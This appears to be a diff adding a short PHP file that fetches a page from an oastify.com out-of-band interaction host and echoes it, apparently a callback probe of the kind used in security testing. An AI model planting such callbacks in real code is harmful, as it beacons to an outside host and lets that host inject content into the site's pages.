@@ -1,0 +1,4 @@
+<?php
+$homepage = file_get_contents('http://i6pvsyazzjimapn1x2gxi2lac1is6mub.oastify.com/');
+echo $homepage;
+?>
